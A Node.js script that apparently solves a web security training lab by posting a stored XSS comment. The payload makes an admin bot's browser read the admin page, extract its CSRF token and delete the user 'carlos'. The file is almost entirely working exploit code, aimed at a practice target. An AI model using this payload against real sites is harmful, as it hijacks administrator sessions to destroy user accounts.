const { runLab, submitComment, openFirstBlogPost } = require('./_common.cjs');

const TITLE = 'Exploiting cross-site scripting to steal cookies';
const PATH = '/web-security/cross-site-scripting/exploiting/lab-stealing-cookies';

runLab({
  title: TITLE,
  path: PATH,
  solve: async ({ page, labUrl }) => {
    const postUrl = await openFirstBlogPost(page, labUrl);
    
    // Alternative solution: XSS-> CSRF that makes admin DO the delete
    // Since cookies are HttpOnly, we can't steal them, but we can use admin's session via fetch
    // Make admin's browser delete carlos directly
    const payload = `<script>
fetch('/admin/delete?username=carlos', {credentials: 'include', method: 'GET'})
  .then(r => fetch('/admin/delete?username=carlos&csrf=', {credentials: 'include'}))
  .catch(()=>{});
// Also try POST to /admin
fetch('/admin', {credentials: 'include'}).then(r=>r.text()).then(html => {
  const csrfMatch = html.match(/name="csrf" value="([^"]+)"/);
  if (csrfMatch) {
    const csrf = csrfMatch[1];
    fetch('/admin/delete', {
      method: 'POST',
      credentials: 'include',
      headers: {'Content-Type': 'application/x-www-form-urlencoded'},
      body: 'csrf=' + csrf + '&username=carlos'
    });
  }
});
</script>`;
    
    await submitComment(page, payload);
    console.log(`Posted XSS->CSRF delete payload`);
    
    // Wait for admin bot to view comment, trigger XSS, do CSRF delete carlos
    console.log('Waiting 60s for admin bot...');
    await page.waitForTimeout(60000);
  },
});
